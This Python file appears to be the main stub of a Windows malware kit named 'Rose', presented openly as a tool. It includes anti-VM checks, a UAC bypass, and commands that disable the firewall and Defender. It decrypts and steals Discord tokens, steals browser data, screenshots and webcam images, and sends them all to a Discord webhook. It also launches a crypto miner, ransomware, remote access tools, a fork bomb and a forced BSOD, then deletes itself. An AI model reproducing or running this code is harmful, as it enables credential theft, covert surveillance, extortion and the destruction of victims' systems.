#  Std imports

import os
import re
import ctypes
import pygame.camera
import getpass
import subprocess
import threading
import sys
import platform
import shutil
from datetime import datetime
from dhooks import File, Embed
from base64 import b64decode
from Crypto.Cipher import AES
from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
from json import loads as json_loads
from PIL import ImageGrab

# Header imports

from bin import rose_rat
from bin import InjectX
from bin import knight_rat
from bin import block_sites
from bin import discordc
from bin import _roblox
from bin import tbsod
from bin import doggo_ransomware
from bin import antivm
from bin import _startup as startup
from bin.games import get_games
from bin.config import Config
from bin.webhook import _WebhookX
from bin.crypto_miner import miner
from bin._random_string import *
from bin.sysinf import send_device_information
from bin.uac_bypass import GetSelf, IsAdmin, UACbypass
from bin.browser import Browsers
from bin.ipinf import Info


cc = Config()

if platform.system() != "Windows":
    sys.exit()

main_path = os.path.join(os.getenv("APPDATA"), 'roseontop')
webhook = cc.get_webhook()
debug_mode = cc.get_debug_mode()
wh_avatar = cc.get_avatar()
wh_name = cc.get_name()
eb_color = cc.get_color()
eb_footer = cc.get_footer()

Threadlist = []
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
username = getpass.getuser()

class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def send_error_notification(exception, type):
    webx = _WebhookX().get_object()

    embed = Embed(
        title='Rose Report',
        description='Rose Instance - Error',
        color=eb_color,
        timestamp=datetime.now().isoformat()
    )

    embed.set_author(name=wh_name, icon_url=wh_avatar)
    embed.set_footer(text=eb_footer, icon_url=wh_avatar)
    embed.add_field(name=f"Error in {type} occured | Help us by reporting this bug", value=f'`{exception}`', inline=False)

    webx.send(embed=embed)

if cc.get_antivm():
    try:
        if antivm.user_check():
            os._exit(1)
        if antivm.hwid_check():
            os._exit(1)
        if antivm.ip_check():
            os._exit(1)
        if antivm.registry_check():
            os._exit(1)
        if antivm.dll_check():
            os._exit(1)
        if antivm.specs_check():
            os._exit(1)
        if antivm.proc_check():
            os._exit(1)
        if antivm.mac_check():
            os._exit(1)
        antivm.process_check()
    except Exception as e:
        send_error_notification(e, 'Rose Anti-VM')

if cc.get_uac_bypass():
    try:
        if not IsAdmin():
            if GetSelf()[1]:
                if UACbypass():
                    os._exit(1)
                else:
                    param = " ".join(sys.argv)
                    if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, param, None, 1) > 32:
                        os._exit(0)
    except Exception as e:
        send_error_notification(e, 'Rose UAC Bypass')

if IsAdmin():
    if cc.get_disable_protectors():
        subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
        subprocess.run(
            'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1',
            shell=True)
    if cc.get_block_sites():
        block_sites.block_sites()

if cc.get_start_up():
    try:
        startup.Startup()
    except Exception as e:
        send_error_notification(e, 'Rose Startup')

if not os.path.exists(main_path):
    try:
        os.mkdir(main_path)
    except Exception as e:
        pass

if cc.get_fake_error():
    try:
        ctypes.windll.user32.MessageBoxW(0, 'loadresources.dll could not be found', f"{os.path.basename(__file__)} - System Error", 16)
    except Exception as e:
        send_error_notification(e, 'Rose Fake Error')

if cc.get_discord_ping():
    try:
        webx = _WebhookX().get_object()
        webx.send('@everyone')
    except Exception as e:
        send_error_notification(e, 'Rose Ping')

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts in ("v10", "v11"):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
                                         byref(blob_entropy), None, None, 0x01,
                                         byref(blob_out)):
        return GetData(blob_out)

Tokens = ""
dclass = discordc.DiscordX()

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)

    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{pathC}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for token in re.findall(
                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                    if dclass.checkToken(
                            tokenDecoded) and tokenDecoded not in Tokens:
                        # print(token)
                        Tokens += tokenDecoded
                        # writeforfile(Tokens, 'tokens')
                        dclass.uploadToken(tokenDecoded)

def GetTokens(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{path}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for regex in (
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                        r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if dclass.checkToken(token) and token not in Tokens:
                            Tokens += token
                            dclass.uploadToken(token)

discordPaths = [
    [f"{roaming}/Discord", "/Local Storage/leveldb"],
    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
    [f"{roaming}/discordptb", "/Local Storage/leveldb"],
]

if cc.get_token_stealing():
    for patt in discordPaths:
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)

if cc.get_browser_stealing():
    try:
        browsers = Browsers(webhook)
    except Exception as e:
        send_error_notification(e, 'Rose Browser Stealer')

if cc.get_screenshot():
    try:
        rndm_strr = get_random_string(5)
        path = os.path.join(main_path, f"screenshot_{rndm_strr}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(path)
        
        webx = _WebhookX().get_object()

        embed = Embed(
            title='Rose Report',
            description='Rose Instance - Screenshot',
            color=eb_color,
            timestamp=datetime.now().isoformat()
        )

        embed.set_author(name=wh_name, icon_url=wh_avatar)
        embed.set_footer(text=eb_footer, icon_url=wh_avatar)

        file = File(path, name='screenshot.png')

        embed.set_image(url=f"attachment://screenshot.png")
        
        webx.send(embed=embed, file=file)
        
        os.remove(path)
    except Exception as e:
        send_error_notification(e, 'Rose Screenshot Stealer')
    
if cc.get_webcam():
    pygame.camera.init()

    camlist = pygame.camera.list_cameras()

    try:
        rndm_strr = get_random_string(5)
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            path = os.path.join(main_path, f"webcam_{rndm_strr}.png")
            pygame.image.save(image, path)
            cam.stop()
            webx = _WebhookX().get_object()

            embed = Embed(
                title='Rose Report',
                description='Rose Instance - Webcam',
                color=eb_color,
                timestamp=datetime.now().isoformat()
            )

            embed.set_author(name=wh_name, icon_url=wh_avatar)
            embed.set_footer(text=eb_footer, icon_url=wh_avatar)

            file = File(path, name='webcam.png')

            embed.set_image(url=f"attachment://webcam.png")
        
            webx.send(embed=embed, file=file)

            os.remove(path)
    except Exception as e:
        send_error_notification(e, 'Rose Webcam Stealer')

if cc.get_games():
    try:
        get_games().get_games()
    except Exception as e:
        send_error_notification(e, 'Rose Games and Application Grabber')

if cc.get_deviceinf_stealing():
    try:
        send_device_information()
    except Exception as e:
        send_error_notification(e, 'Rose Device Data Stealing')

if cc.get_ipinf_stealing():
    try:
        Info().send_data()
    except Exception as e:
        send_error_notification(e, 'Rose IP & Wi-Fi Data')

if cc.get_injection():
    try:
        InjectX.InjectionX(webhook)
    except Exception as e:
        send_error_notification(e, 'Rose Discord Injection')

if cc.get_roblox_stealing():
    try:
        _roblox.RobloxX().run()
    except Exception as e:
        send_error_notification(e, 'Rose Roblox Stealer')

if cc.silent_crypto_miner():
    try:
        miner.run_miner()
    except Exception as e:
        send_error_notification(e, 'Rose Silent Crypto Miner')

if os.path.exists(main_path):
    try:
        shutil.rmtree(main_path)
    except Exception as e:
        pass

if cc.get_ransomware():
    try:
        threading.Thread(target=doggo_ransomware.ransomware()).start()
    except Exception as e:
        send_error_notification(e, 'Doggo Ransomware')

if cc.get_knight_discord_rat():
    try:
        threading.Thread(target=knight_rat.run_rat()).start()
    except Exception as e:
        send_error_notification(e, 'Knight Remote Access')

if cc.get_rose_discord_rat():
    try:
        threading.Thread(target=rose_rat.run_rat()).start()
    except Exception as e:
        send_error_notification(e, 'Rose Remote Access')

if cc.get_bbcrash():
    try:
        cr_file=os.path.join(os.getenv('appdata'), 'rose', 'csh45r.bat')
        with open(cr_file, 'w') as f:
            f.write('%0|%0')

        subprocess.run("start /min cmd /k call {}".format(cr_file), shell=True, startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW))
    except Exception as e:
        send_error_notification(e, 'Rose Batch Crash Attempter')

if cc.get_tsbsod():
    try:
        tbsod.Trigger()
    except Exception as e:
        send_error_notification(e, 'Rose Trigger BSOD')

if cc.get_rose_melt_stub():
    try:
        if not (cc.get_knight_discord_rat() or cc.get_rose_discord_rat() or cc.get_ransomware()):
        
            path = sys.argv[0]

            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

            sys.exit()
    except Exception as e:
        send_error_notification(e, 'Rose Anti Debug')
